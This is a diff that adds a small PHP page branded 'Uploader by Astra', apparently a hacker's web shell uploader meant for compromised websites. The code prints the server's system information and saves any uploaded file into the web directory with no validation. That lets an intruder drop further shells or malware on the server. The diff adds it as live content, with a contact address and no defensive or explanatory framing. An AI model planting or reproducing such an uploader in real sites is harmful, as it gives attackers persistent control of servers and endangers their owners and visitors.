@@ -1,0 +1,43 @@
+<html>
+<head>
+<title>Uploader by Astra</title>
+<link href='http://fonts.googleapis.com/css?family=Jolly+Lodger' rel='stylesheet' type='text/css'> 
+<style type='text/css'>
+body  {background: url(http://i.imgur.com/nghBGN9.gif) no-repeat center center fixed;
+                                background-size: cover;
+                                    -webkit-background-size: cover;
+                                    -moz-background-size: cover;
+                                    -o-background-size: cover;
+    }
+</style>
+<table width="100%" height="100%"><td align=center>
+</head>
+<body>
+<center><font face="Jolly Lodger" size="6" color="lime"><b>&#1203;&#824;&#1202;&#824;&#1203; Uploader by Astra &#1203;&#824;&#1202;&#824;&#1203;</b>
+<br>
+<center><font face="Jolly Lodger" size="5" color="lime"><b>Discovering and Exploiting Security Flaws</b>
+<br><br>
+<?php
+echo "<b>".php_uname()."</b><br>";
+if(isset($_POST['Submit'])){
+$filedir = "";
+$maxfile = '2000000';
+
+$userfile_name = $_FILES['image']['name'];
+$userfile_tmp = $_FILES['image']['tmp_name'];
+if (isset($_FILES['image']['name'])) {
+$abod = $filedir.$userfile_name;
+@move_uploaded_file($userfile_tmp, $abod);
+
+echo"<center>Success ==> <a href='$userfile_name' target='_blank' style='text-decoration:none;'>$userfile_name</a></center>";
+}
+}
+else{
+echo'
+<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
+}
+?>
+<br>
+putratmvn0@gmail.com
+</body>
+</html>
